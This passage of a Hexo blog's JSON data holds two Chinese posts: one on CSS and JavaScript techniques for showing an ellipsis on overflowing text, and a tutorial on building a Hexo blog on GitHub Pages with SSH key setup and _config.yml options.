property），它没有出现在 CSS 规范草案中。\n- **display: -webkit-box** 将对象作为弹性伸缩盒子模型显示 。\n- -webkit-box-orient 设置或检索伸缩盒对象的子元素的排列方式 。\n- text-overflow: ellipsis 以用来多行文本的情况下，用省略号“…”隐藏超出范围的文本。\n\n#### 利用伪类\n\n```\n<div id=\"con\">\n  <span id=\"txt\">文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略</span>\n  <span class=\"t\"></span>\n</div>\n\n<style>\n#txt{\n  display: inline-block;\n  height: 40px;\n  width: 250px;\n  line-height: 20px;\n  overflow: hidden;\n  font-size: 16px;\n}\n.t:after{\n  display: inline;\n  content: \"...\";\n  font-size: 16px;\n\n}\n</style>\n```\n\n#### 利用绝对定位和 padding;(跨浏览器解决方案)\n\n```\n<p id=\"con2\">文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略<span class=\"t2\">...</span>\n</p>\n\n<style>\n#con2{\n  position: relative;\n  height: 40px;\n  width: 250px;\n  line-height: 20px;\n  overflow: hidden;\n  padding-right: 12px;\n}\n.t2{\n  position: absolute;\n  right: 0;\n  bottom: 0;\n}\n</style>\n```\n\n这个方法的原理是：首先在包含文字的元素里，嵌入一个<span>...</span>，然后包含文字的元素右侧留出...的位置(padding-right),最后利用绝对定位将...定位至右侧的 padding-right 区域\n\n#### 利用 js\n\n```\n   function mitulineHide(num,con){\n        var contain = document.getElementById(con);\n         console.log(con);\n        var maxSize = num;\n        var txt = contain.innerHTML;\n        if(txt.length>num){\n            console.log('1')\n            txt = txt.substring(0,num-1)+\"...\"\n            contain.innerHTML = txt;\n        }else{\n            console.log(\"error\")\n        }\n    };\n```\n\n该函数传入俩个参数：允许的最大文字数目、包含文字的元素节点 Id\n","source":"_posts/文本溢出的处理方法.md","raw":"---\ntitle: 文本溢出的处理方法\ndate: 2019-04-10 16:48:33\ntags:\n  - 笔记\n  - CSS\n---\n\n# CSS 文本溢出显示省略号\n\n项目中常常有这种需要我们对溢出文本进行\"...\"显示的操作，单行多行的情况都有,，具体情况根据设计稿\n\n先来看一下文本溢出的情况\n\n![img1](文本溢出的处理方法/img1.png)\n\n## 单行文本溢出\n\n```\n// 单行文本溢出显示...\n.ellipsis {\n  overflow: hidden;\n  text-overflow: ellipsis;\n  white-space: nowrap;\n}\n\n```\n\n![img2](文本溢出的处理方法/img2.png)\n\n## 多行文本溢出\n\n#### 利用 css 属性设置（仅适用于 WebKit 内核）\n\n```\n// 双行文本溢出显示...\n.multiellipsis {\n  overflow: hidden;\n  text-overflow: ellipsis;\n  display: -webkit-box;\n  -webkit-line-clamp: 2;\n  -webkit-box-orient: vertical;\n}\n```\n\n![img3](文本溢出的处理方法/img3.png)\n\n**移动端浏览器绝大部分是 WebKit 内核的，所以该方法适用于移动端**；\n\n- **-webkit-line-clamp** 用来限制在一个块元素显示的文本的行数,这是一个不规范的属性（unsupported WebKit property），它没有出现在 CSS 规范草案中。\n- **display: -webkit-box** 将对象作为弹性伸缩盒子模型显示 。\n- -webkit-box-orient 设置或检索伸缩盒对象的子元素的排列方式 。\n- text-overflow: ellipsis 以用来多行文本的情况下，用省略号“…”隐藏超出范围的文本。\n\n#### 利用伪类\n\n```\n<div id=\"con\">\n  <span id=\"txt\">文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略</span>\n  <span class=\"t\"></span>\n</div>\n\n<style>\n#txt{\n  display: inline-block;\n  height: 40px;\n  width: 250px;\n  line-height: 20px;\n  overflow: hidden;\n  font-size: 16px;\n}\n.t:after{\n  display: inline;\n  content: \"...\";\n  font-size: 16px;\n\n}\n</style>\n```\n\n#### 利用绝对定位和 padding;(跨浏览器解决方案)\n\n```\n<p id=\"con2\">文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略<span class=\"t2\">...</span>\n</p>\n\n<style>\n#con2{\n  position: relative;\n  height: 40px;\n  width: 250px;\n  line-height: 20px;\n  overflow: hidden;\n  padding-right: 12px;\n}\n.t2{\n  position: absolute;\n  right: 0;\n  bottom: 0;\n}\n</style>\n```\n\n这个方法的原理是：首先在包含文字的元素里，嵌入一个<span>...</span>，然后包含文字的元素右侧留出...的位置(padding-right),最后利用绝对定位将...定位至右侧的 padding-right 区域\n\n#### 利用 js\n\n```\n   function mitulineHide(num,con){\n        var contain = document.getElementById(con);\n         console.log(con);\n        var maxSize = num;\n        var txt = contain.innerHTML;\n        if(txt.length>num){\n            console.log('1')\n            txt = txt.substring(0,num-1)+\"...\"\n            contain.innerHTML = txt;\n        }else{\n            console.log(\"error\")\n        }\n    };\n```\n\n该函数传入俩个参数：允许的最大文字数目、包含文字的元素节点 Id\n","slug":"文本溢出的处理方法","published":1,"updated":"2022-02-23T03:09:02.932Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950d0000hn0w188oyfn7i","content":"<h1 id=\"CSS-文本溢出显示省略号\"><a href=\"#CSS-文本溢出显示省略号\" class=\"headerlink\" title=\"CSS 文本溢出显示省略号\"></a>CSS 文本溢出显示省略号</h1><p>项目中常常有这种需要我们对溢出文本进行”…”显示的操作，单行多行的情况都有,，具体情况根据设计稿</p>\n<p>先来看一下文本溢出的情况</p>\n<p><img src=\"%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/img1.png\" alt=\"img1\"></p>\n<h2 id=\"单行文本溢出\"><a href=\"#单行文本溢出\" class=\"headerlink\" title=\"单行文本溢出\"></a>单行文本溢出</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 单行文本溢出显示...</span><br><span class=\"line\">.ellipsis &#123;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  text-overflow: ellipsis;</span><br><span class=\"line\">  white-space: nowrap;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/img2.png\" alt=\"img2\"></p>\n<h2 id=\"多行文本溢出\"><a href=\"#多行文本溢出\" class=\"headerlink\" title=\"多行文本溢出\"></a>多行文本溢出</h2><h4 id=\"利用-css-属性设置（仅适用于-WebKit-内核）\"><a href=\"#利用-css-属性设置（仅适用于-WebKit-内核）\" class=\"headerlink\" title=\"利用 css 属性设置（仅适用于 WebKit 内核）\"></a>利用 css 属性设置（仅适用于 WebKit 内核）</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 双行文本溢出显示...</span><br><span class=\"line\">.multiellipsis &#123;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  text-overflow: ellipsis;</span><br><span class=\"line\">  display: -webkit-box;</span><br><span class=\"line\">  -webkit-line-clamp: 2;</span><br><span class=\"line\">  -webkit-box-orient: vertical;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/img3.png\" alt=\"img3\"></p>\n<p><strong>移动端浏览器绝大部分是 WebKit 内核的，所以该方法适用于移动端</strong>；</p>\n<ul>\n<li><strong>-webkit-line-clamp</strong> 用来限制在一个块元素显示的文本的行数,这是一个不规范的属性（unsupported WebKit property），它没有出现在 CSS 规范草案中。</li>\n<li><strong>display: -webkit-box</strong> 将对象作为弹性伸缩盒子模型显示 。</li>\n<li>-webkit-box-orient 设置或检索伸缩盒对象的子元素的排列方式 。</li>\n<li>text-overflow: ellipsis 以用来多行文本的情况下，用省略号“…”隐藏超出范围的文本。</li>\n</ul>\n<h4 id=\"利用伪类\"><a href=\"#利用伪类\" class=\"headerlink\" title=\"利用伪类\"></a>利用伪类</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;con&quot;&gt;</span><br><span class=\"line\">  &lt;span id=&quot;txt&quot;&gt;文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略&lt;/span&gt;</span><br><span class=\"line\">  &lt;span class=&quot;t&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">#txt&#123;</span><br><span class=\"line\">  display: inline-block;</span><br><span class=\"line\">  height: 40px;</span><br><span class=\"line\">  width: 250px;</span><br><span class=\"line\">  line-height: 20px;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  font-size: 16px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.t:after&#123;</span><br><span class=\"line\">  display: inline;</span><br><span class=\"line\">  content: &quot;...&quot;;</span><br><span class=\"line\">  font-size: 16px;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"利用绝对定位和-padding-跨浏览器解决方案\"><a href=\"#利用绝对定位和-padding-跨浏览器解决方案\" class=\"headerlink\" title=\"利用绝对定位和 padding;(跨浏览器解决方案)\"></a>利用绝对定位和 padding;(跨浏览器解决方案)</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;p id=&quot;con2&quot;&gt;文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略&lt;span class=&quot;t2&quot;&gt;...&lt;/span&gt;</span><br><span class=\"line\">&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">#con2&#123;</span><br><span class=\"line\">  position: relative;</span><br><span class=\"line\">  height: 40px;</span><br><span class=\"line\">  width: 250px;</span><br><span class=\"line\">  line-height: 20px;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  padding-right: 12px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.t2&#123;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">  right: 0;</span><br><span class=\"line\">  bottom: 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这个方法的原理是：首先在包含文字的元素里，嵌入一个<span>…</span>，然后包含文字的元素右侧留出…的位置(padding-right),最后利用绝对定位将…定位至右侧的 padding-right 区域</p>\n<h4 id=\"利用-js\"><a href=\"#利用-js\" class=\"headerlink\" title=\"利用 js\"></a>利用 js</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function mitulineHide(num,con)&#123;</span><br><span class=\"line\">     var contain = document.getElementById(con);</span><br><span class=\"line\">      console.log(con);</span><br><span class=\"line\">     var maxSize = num;</span><br><span class=\"line\">     var txt = contain.innerHTML;</span><br><span class=\"line\">     if(txt.length&gt;num)&#123;</span><br><span class=\"line\">         console.log(&#x27;1&#x27;)</span><br><span class=\"line\">         txt = txt.substring(0,num-1)+&quot;...&quot;</span><br><span class=\"line\">         contain.innerHTML = txt;</span><br><span class=\"line\">     &#125;else&#123;</span><br><span class=\"line\">         console.log(&quot;error&quot;)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;;</span><br></pre></td></tr></table></figure>\n\n<p>该函数传入俩个参数：允许的最大文字数目、包含文字的元素节点 Id</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"CSS-文本溢出显示省略号\"><a href=\"#CSS-文本溢出显示省略号\" class=\"headerlink\" title=\"CSS 文本溢出显示省略号\"></a>CSS 文本溢出显示省略号</h1><p>项目中常常有这种需要我们对溢出文本进行”…”显示的操作，单行多行的情况都有,，具体情况根据设计稿</p>\n<p>先来看一下文本溢出的情况</p>\n<p><img src=\"%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/img1.png\" alt=\"img1\"></p>\n<h2 id=\"单行文本溢出\"><a href=\"#单行文本溢出\" class=\"headerlink\" title=\"单行文本溢出\"></a>单行文本溢出</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 单行文本溢出显示...</span><br><span class=\"line\">.ellipsis &#123;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  text-overflow: ellipsis;</span><br><span class=\"line\">  white-space: nowrap;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/img2.png\" alt=\"img2\"></p>\n<h2 id=\"多行文本溢出\"><a href=\"#多行文本溢出\" class=\"headerlink\" title=\"多行文本溢出\"></a>多行文本溢出</h2><h4 id=\"利用-css-属性设置（仅适用于-WebKit-内核）\"><a href=\"#利用-css-属性设置（仅适用于-WebKit-内核）\" class=\"headerlink\" title=\"利用 css 属性设置（仅适用于 WebKit 内核）\"></a>利用 css 属性设置（仅适用于 WebKit 内核）</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 双行文本溢出显示...</span><br><span class=\"line\">.multiellipsis &#123;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  text-overflow: ellipsis;</span><br><span class=\"line\">  display: -webkit-box;</span><br><span class=\"line\">  -webkit-line-clamp: 2;</span><br><span class=\"line\">  -webkit-box-orient: vertical;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/img3.png\" alt=\"img3\"></p>\n<p><strong>移动端浏览器绝大部分是 WebKit 内核的，所以该方法适用于移动端</strong>；</p>\n<ul>\n<li><strong>-webkit-line-clamp</strong> 用来限制在一个块元素显示的文本的行数,这是一个不规范的属性（unsupported WebKit property），它没有出现在 CSS 规范草案中。</li>\n<li><strong>display: -webkit-box</strong> 将对象作为弹性伸缩盒子模型显示 。</li>\n<li>-webkit-box-orient 设置或检索伸缩盒对象的子元素的排列方式 。</li>\n<li>text-overflow: ellipsis 以用来多行文本的情况下，用省略号“…”隐藏超出范围的文本。</li>\n</ul>\n<h4 id=\"利用伪类\"><a href=\"#利用伪类\" class=\"headerlink\" title=\"利用伪类\"></a>利用伪类</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;con&quot;&gt;</span><br><span class=\"line\">  &lt;span id=&quot;txt&quot;&gt;文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略&lt;/span&gt;</span><br><span class=\"line\">  &lt;span class=&quot;t&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">#txt&#123;</span><br><span class=\"line\">  display: inline-block;</span><br><span class=\"line\">  height: 40px;</span><br><span class=\"line\">  width: 250px;</span><br><span class=\"line\">  line-height: 20px;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  font-size: 16px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.t:after&#123;</span><br><span class=\"line\">  display: inline;</span><br><span class=\"line\">  content: &quot;...&quot;;</span><br><span class=\"line\">  font-size: 16px;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"利用绝对定位和-padding-跨浏览器解决方案\"><a href=\"#利用绝对定位和-padding-跨浏览器解决方案\" class=\"headerlink\" title=\"利用绝对定位和 padding;(跨浏览器解决方案)\"></a>利用绝对定位和 padding;(跨浏览器解决方案)</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;p id=&quot;con2&quot;&gt;文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略&lt;span class=&quot;t2&quot;&gt;...&lt;/span&gt;</span><br><span class=\"line\">&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">#con2&#123;</span><br><span class=\"line\">  position: relative;</span><br><span class=\"line\">  height: 40px;</span><br><span class=\"line\">  width: 250px;</span><br><span class=\"line\">  line-height: 20px;</span><br><span class=\"line\">  overflow: hidden;</span><br><span class=\"line\">  padding-right: 12px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.t2&#123;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">  right: 0;</span><br><span class=\"line\">  bottom: 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这个方法的原理是：首先在包含文字的元素里，嵌入一个<span>…</span>，然后包含文字的元素右侧留出…的位置(padding-right),最后利用绝对定位将…定位至右侧的 padding-right 区域</p>\n<h4 id=\"利用-js\"><a href=\"#利用-js\" class=\"headerlink\" title=\"利用 js\"></a>利用 js</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function mitulineHide(num,con)&#123;</span><br><span class=\"line\">     var contain = document.getElementById(con);</span><br><span class=\"line\">      console.log(con);</span><br><span class=\"line\">     var maxSize = num;</span><br><span class=\"line\">     var txt = contain.innerHTML;</span><br><span class=\"line\">     if(txt.length&gt;num)&#123;</span><br><span class=\"line\">         console.log(&#x27;1&#x27;)</span><br><span class=\"line\">         txt = txt.substring(0,num-1)+&quot;...&quot;</span><br><span class=\"line\">         contain.innerHTML = txt;</span><br><span class=\"line\">     &#125;else&#123;</span><br><span class=\"line\">         console.log(&quot;error&quot;)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;;</span><br></pre></td></tr></table></figure>\n\n<p>该函数传入俩个参数：允许的最大文字数目、包含文字的元素节点 Id</p>\n"},{"title":"如何利用Hexo+Github搭建博客","date":"2019-04-01T09:12:54.000Z","_content":"\n## 安装依赖环境\n\n[Git:https://git-scm.com/downloads](https://git-scm.com/downloads)\n[Node:https://nodejs.org/en/download/](https://nodejs.org/en/download/)\n\n### 如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。\n\n- 安装 Hexo\n\n```\n$ npm install -g hexo-cli\n\n```\n\n### 安装\n\n- 安装 Git\n  下载并安装 [Git](https://git-scm.com/downloads).\n- 安装 Node\n  下载并安装 [Node](https://nodejs.org/en/download/)\n  - 检查是否安装成功\n\n```\n$ node -v\n```\n\n![node_v](如何利用Hexo-Github搭建博客/node_v.png)\n\n- 安装 Hexo\n\n```\n$ npm install -g hexo-cli\n\n```\n\n- 检查是否安装成功\n\n```\n$ hexo -v\n```\n\n![hexo_v](如何利用Hexo-Github搭建博客/-v.png)\n\n## 创建 Hexo\n\n- 新建文件夹并初始化\n\n```\n$ hexo init <folder>\n```\n\n- 进入文件夹\n\n```\n$ cd <folder>\n```\n\n- 安装依赖\n\n```\n$ npm install\n\n```\n\n### 安装完成，项目结构目录如下\n\n├── \\_config.yml // 网站的配置信息\n├── package.json // 应用程序信息\n├── scaffolds // 模板文件夹\n├── source // 存放用户资源\n│ ├── \\_drafts\n│ ├── \\_post\n└── themes // 主题\n\n- 创建\n\n```\n$ hexo g\n\n```\n\n- 在服务端打开\n\n```\n$ hexo server\n\n```\n\n![server](如何利用Hexo-Github搭建博客/server.png)\n你就可以查看你的 hexo 了，默认端口 4000，[http://localhost:4000](http://localhost:4000)\n\n## 新建 git 仓库项目\n\nGithub 账户注册和新建项目\n\n- 新建\n  ![new](如何利用Hexo-Github搭建博客/new.png)\n- 项目名称格式： **githubname**.github.io,如：zhangsan.github.io\n  *注意：*一定要是你注册 github 的用户名+github.io\n  ![create_new_repo](如何利用Hexo-Github搭建博客/create_new_repo.png)\n- Github Pages\n  选择 settings，下拉至 Github Pages，你就发现你刚才新建的项目已经部署到网上了，可以直接访问\n  ![github_pages](如何利用Hexo-Github搭建博客/github_pages.png)\n\n## 将 git 仓库与 hexo 关联起来\n\n在所在文件夹 打开 Git Bash\n\n- 设置你的 github 用户名和邮箱\n\n```\n$ git config --global user.name \"github_name\"\n$ git config --global user.emil \"github_emil\"\n\n//你的github注册名和注册邮箱\n\n```\n\n![emil](如何利用Hexo-Github搭建博客/emil.png)\n\n- 检查是否存在 ssh key\n\n```\n$ cd ~/.ssh\n```\n\n- 如果已经存在，可可以看见该.ssh 文件夹\n  ![ssh_folder](如何利用Hexo-Github搭建博客/ssh_folder.png)\n- 如果没有则需要去生成\n\n```\n$ ssh-keygen -t rsa -C \"github_emil\"\n// 三次回车，就会生成key\n```\n\n![key](如何利用Hexo-Github搭建博客/key.png)\n\n- 进入.ssh 文件夹,可以看见三个文件，id_rsa 是你的私钥，id_rsa.pub 是公钥，需要放在 github 上，这样你每次提交代码到仓库，都会进行本地的私钥和 git 混的公钥进行匹配，匹配完成，你才能进行一系列的操作\n  ![ssh_folder](如何利用Hexo-Github搭建博客/ssh_folder.png)\n- 打开 id_rsa.pub，复制里面的内容到 github 上的 SSH key 中（最后一行包含的是你的注册邮箱的信息）\n  ![ssh_text](如何利用Hexo-Github搭建博客/ssh_text.png)\n- 登录 Github，点击头像下的 **settings**\n  ![set_ssh](如何利用Hexo-Github搭建博客/set_ssh.png)\n- 选择 **SSH and GPG keys**\n- 找到右侧 **New SSH key**\n  ![ssh_key](如何利用Hexo-Github搭建博客/ssh_key.png)\n- title 随便填写，将复制的 id_rsa.pub 内容放至 key 中，点击**Add SSH key**保存，即可\n- 输入 ssh -T git@github.com，测试添加 ssh 是否成功\n\n```\n$ ssh -T git@github.com\n```\n\n如果看见**Hi,xxxxx...**,说明你就成功了\n![test_ssh](如何利用Hexo-Github搭建博客/test_ssh.png)\n\n## 新建文章\n\n```\n$ hexo new post \"如何利用Hexo-Github搭建博客\"\n```\n\n## 配置 deploy\n\n- 打开根目录下的\\_config.yml 文件\n- deploy:\n  - type: git\n  - repo: git@github.com:**githubname**/**githubname**.github.io.git\n  - branch: master\n\n## 安装插件\n\n```\n$ npm install hexo-deployer-git --save\n```\n\n## 生成文章\n\n```\n$ hexo g\n```\n\n## 完成部署\n\n```\n$ hexo d\n```\n\n## 打开 **https://githubname.github.io/** ,查看你的博客吧！\n\n# 关于 Hexo 的详细配置\n\n## 配置信息 \\_config.yml\n\n#### Site（网站）\n\n| 参数        | 描述                               |\n| ----------- | :--------------------------------- |\n| title       | 网站标题                           |\n| subtitle    | 网站副标题                         |\n| description | 网站描述，description 主要用于 SEO |\n| keywords    | 关键字                             |\n| author      | 你的名字                           |\n| language    | 网站使用的语言                     |\n| timezone    | 网站时区，默认是你电脑的时区       |\n\n#### URL(网址)\n\n| 参数               | 描述                     | 默认值                    |\n| ------------------ | :----------------------- | :------------------------ |\n| url                | 网址                     |\n| root               | 网站根目录               |\n| permalink          | 文章的永久链接格式       | :year/:month/:day/:title/ |\n| permalink_defaults | 永久链接中各部分的默认值 |\n\n##### 网站存放在子目录\n\n如果你的网站存放在子目录中：http://yoursite.com/blog，则：\nurl：http://yoursite.com/blog\nroot：/blog/\n\n#### Directory(目录)\n\n| 参数         | 描述                                         | 默认值         |\n| ------------ | :------------------------------------------- | :------------- |\n| source_dir   | 资源文件夹，这个文件夹用来存放内容           | source         |\n| public_dir   | 公共文件夹，这个文件夹用于存放生成的站点文件 | public         |\n| tag_dir      | 标签文件夹                                   | tags           |\n| archive_dir  | 归档文件夹                                   | archives       |\n| category_dir | 分类文件夹                                   | categories     |\n| code_dir     | Include code 文件夹                          | downloads/code |\n| i18n_dir     | 国际化文件夹                                 | :lang          |\n| skip_render  | 跳过指定文件的渲染                           |\n\ntips：如果您刚刚开始接触 Hexo，通常没有必要修改这一部分的值。\n\n#### Writing（文章）\n\n| 参数              | 描述                               | 默认值    |\n| ----------------- | :--------------------------------- | :-------- |\n| new_post_name     | 新建文章的名称                     | :title.md |\n| default_layout    | 预设布局                           | post      |\n| auto_spacing      | 在中文和英文之间加入空格           | false     |\n| titlecase         | 把标题转为 title case              | false     |\n| external_link     | 在新标签中打开链接                 | true      |\n| filename_case     | 把文件名称转换为小写(1)或者大写(2) | 0         |\n| render_drafts     | 显示草稿                           | false     |\n| post_asset_folder | 启动 Asset 文件夹                  | true      |\n| relative_link     | 把链接改为与根目录的相对位址       | false     |\n| future            | 现实未来的文章                     | true      |\n| highlight         | 代码块的设置                       |\n\n#### Category & Tag（分类&标签）\n\n| 参数             | 描述     | 默认值        |\n| ---------------- | :------- | :------------ |\n| default_category | 默认分类 | uncategorized |\n| category_map     | 分类别名 |\n| tag_map          | 标签别名 |\n\n#### Date / Time format\n\nHexo 使用 Moment.js 来解析和显示时间。\n\n| 参数        | 描述     | 默认值     |\n| ----------- | :------- | :--------- |\n| date_format | 日期格式 | YYYY-MM-DD |\n| time_format | 时间格式 | HH:mm:ss   |\n\n#### Pagination（分页）\n\n| 参数           | 描述                                | 默认值 |\n| -------------- | :---------------------------------- | :----- |\n| per_page       | 每页显示的文章量 (0 = 关闭分页功能) | 10     |\n| pagination_dir | 分页目录                            | page   |\n\n#### Extensions（扩展）\n\n[Plugins](https://hexo.io/plugins/)\n[Themes](https://hexo.io/themes/)\n\n| 参数  | 描述                            | 默认值    |\n| ----- | :------------------------------ | :-------- |\n| theme | 当前主题，值为 false 时禁用主题 